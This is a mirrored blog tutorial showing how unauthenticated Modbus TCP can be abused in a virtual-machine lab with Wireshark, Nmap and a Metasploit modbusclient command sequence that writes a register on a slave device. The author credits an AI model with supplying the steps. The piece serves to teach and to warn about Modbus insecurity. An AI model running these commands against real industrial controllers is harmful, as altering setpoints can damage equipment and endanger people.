@@ -1,0 +1,123 @@
+---
+title: "Exploiting Modbus TCP Vulnerabilities"
+slug: "blog-explotando-vulnerabilidades-modbus-tcp"
+locale: "en"
+category: "comunicaciones"
+originalUrl: "https://www.plc-hmi-scadas.com/en/blog/explotando-vulnerabilidades-modbus-tcp/"
+author: "Pedro Pagán Pallarés"
+date: ""
+breadcrumbs: ["Home","Comunicaciones","MODBUS"]
+tags: ["Exploits","AI","Artificial Intelligence","Modbus TCP","OT Network","NETWORKS","Wireshark"]
+downloads: []
+credit: "Original content (c) its authors at https://www.plc-hmi-scadas.com. Mirrored offline for personal study; see originalUrl."
+---
+[Home](#/a/en%2Fhome) › [Comunicaciones](#/a/en%2Findustrial-communications) › [MODBUS](#/a/en%2Fmodbus) › Article
+
+# Exploiting Modbus TCP Vulnerabilities
+
+Pedro Pagán Pallarés Jun 01, 2024
+
+Exploits AI Artificial Intelligence Modbus TCP OT Network NETWORKS Wireshark
+
+![Exploiting Modbus TCP Vulnerabilities](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/DALL%C2%B7E-2024-06-01-16.45.11-A-comic-style-illustration-of-a-hacker-sitting-next-to-an-industrial-facility-accessing-the-control-of-various-machines.-The-hacker-dressed-in-a-hoo.png)
+
+_**Warning:** the purpose of this article is to demonstrate that communications using the Modbus TCP protocol are not secure and therefore, it is advisable to protect communications using other encrypted protocols_. _Otherwise, we would be putting the security of our systems at risk._
+
+* * *
+
+Continuing from the previous article, where we already saw that Modbus TCP is not encrypted and does not require authentication, we will now see how **we can exploit those vulnerabilities** to write to the registers.
+
+* * *
+
+### Step 1: **Architecture and Modbus Communication in Local Network**
+
+For this example, I have worked with 3 virtual machines (VM - Virtual machines):
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-18.png)
+
+The 3 machines will be on a local network, so make sure to ping between all of them and adjust the network adapters to assign each one its IP address.
+
+### Step 2: **Configure Modbus Master and Slave.**
+
+#### Step 2.1: **Configure the Slave**
+
+This step is similar to that of the [previous post](#/a/en%2Fblog-espionage-modbus-communications), that is, the Modbus slave will be exactly the same as it will run on its own server 127.0.0.1 Port 502.
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-10-1024x518.png)
+
+#### Step 2.2: **Configure the Master**
+
+However, the Modbus Master that will obtain data from the slave has to do so from outside the PC, so we need to tell it which IP on the local network our Slave is on. In my case, it is on IP **192.168.1.50** and we already know the port, 502.
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-11.png)
+
+We accept and check that there is communication when the red text "No connection" disappears.
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-12.png)
+
+### Step 3: **Wireshark - Exploring the Frames**
+
+In this case, we select the Ethernet0 network card
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-19.png)
+
+We filter again by "modbus" and select one of the frames, checking that we indeed read the same as the Poll.
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-20-1024x482.png)
+
+### Step 4: **Port Scanning with Nmap and Kali-Linux**
+
+We already have our two machines communicating. It is time to monitor those communications and explore them to understand the communication.
+
+*   **Target machine port scanning:** we will perform a port scan from the Kali-Linux machine to our Modbus slave (192.168.1.50), which is our target machine.
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-13.png)
+
+We observe that it has several open ports, including 502 as we expected with the status "open" and name "mbap".
+
+### Step 5: **Using Modbus Metasploits with AI Assistance**
+
+At this point, we are going to use [metasploits](https://en.wikipedia.org/wiki/Metasploit), which are tools that exploit vulnerabilities found in different systems.
+
+I am not an expert in the hacking world, but as always, AI is the best ally if you know what you want to do. In this case, it has been very helpful as it provided me with clear and simple steps to execute this attack.
+
+In fact, I sent it an image of the port, told it that I have a Kali-Linux machine, and to use the existing metasploits to write to its registers, the response was spectacularly good and practical. The result, with some iterations, was this code:
+
+Bash
+
+Code
+
+```
+sudo msfconsole
+use auxiliary/scanner/scada/modbusclient
+set RHOSTS 192.168.1.50
+set RPORT 502
+set UNIT_NUMBER 1
+set DATA_ADDRESS 0
+set DATA 12345
+set ACTION WRITE_REGISTER
+
+run
+```
+
+Run it one by one to see that it is doing it correctly:
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-17.png)
+
+**Result:** the specified value is perfectly written in the indicated register.
+
+![](./assets/images/blog-explotando-vulnerabilidades-modbus-tcp/image-16.png)
+
+## Conclusions
+
+*   Classic Modbus TCP is very vulnerable and it is very easy to infiltrate the communication and modify values.
+*   AI is a very powerful tool to help us detect these vulnerabilities and adequately defend ourselves.
+
+**Practical case:** imagine you have a PLC that controls a device through Modbus communications, and it is writing a temperature reference. With the example seen today and exploiting the vulnerabilities of the Modbus TCP protocol, we could easily access through these metasploits from within the network and cause problems in the system.
+
+#### Pedro Pagán Pallarés
+
+Automation and industrial organization engineer specialized in data and applied AI.
+
+---
+*Source: [Exploiting Modbus TCP Vulnerabilities](https://www.plc-hmi-scadas.com/en/blog/explotando-vulnerabilidades-modbus-tcp/) — Pedro Pagán Pallarés*
